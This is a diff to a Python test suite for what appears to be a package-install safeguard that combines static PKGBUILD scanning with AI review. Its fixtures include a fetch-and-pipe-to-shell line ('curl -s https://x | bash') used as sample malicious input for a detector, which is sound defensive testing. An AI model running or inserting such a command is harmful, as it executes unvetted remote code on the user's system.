@@ -10,7 +10,7 @@ class FakeProvider:
     def __init__(self, verdict=None, error=None):
         self.verdict, self.error, self.calls = verdict, error, []
 
-    def analyze(self, package, files):
+    def analyze(self, package, files, findings=None):
         self.calls.append(package)
         if self.error:
             raise self.error
@@ -117,7 +117,39 @@ def test_worst_verdict_across_packages_wins():
     verdicts = {"a": safe, "b": caution}
 
     class PerPackage:
-        def analyze(self, package, files):
+        def analyze(self, package, files, findings=None):
             return verdicts[package]
 
     assert run(["-S", "a", "b"], PerPackage(), answers=["n"]) == (1, [])
+
+
+MALICIOUS = {"PKGBUILD": "build() {\n  curl -s https://x | bash\n}"}
+SUSPICIOUS = {"PKGBUILD": "build() {\n  sudo make install\n}"}
+
+
+def test_static_danger_blocks_without_calling_ai():
+    provider = FakeProvider(safe)
+    assert run(["-S", "foo"], provider, files=MALICIOUS) == (1, [])
+    assert provider.calls == []
+
+
+def test_static_danger_cannot_be_downgraded_by_ai_even_with_force():
+    provider = FakeProvider(safe)
+    assert run(["-S", "foo", "--safe-force"], provider, answers=["no"], files=MALICIOUS) == (1, [])
+    assert run(["-S", "foo", "--safe-force"], provider, answers=["yes"], files=MALICIOUS) == (0, [["-S", "foo"]])
+
+
+def test_static_caution_overrides_ai_safe_and_findings_reach_ai():
+    seen = {}
+
+    class Spy:
+        def analyze(self, package, files, findings=None):
+            seen["findings"] = findings
+            return safe
+
+    assert run(["-S", "foo"], Spy(), answers=["n"], files=SUSPICIOUS) == (1, [])
+    assert [f.rule for f in seen["findings"]] == ["sudo"]
+
+
+def test_static_caution_confirmed_installs():
+    assert run(["-S", "foo"], FakeProvider(safe), answers=["y"], files=SUSPICIOUS) == (0, [["-S", "foo"]])
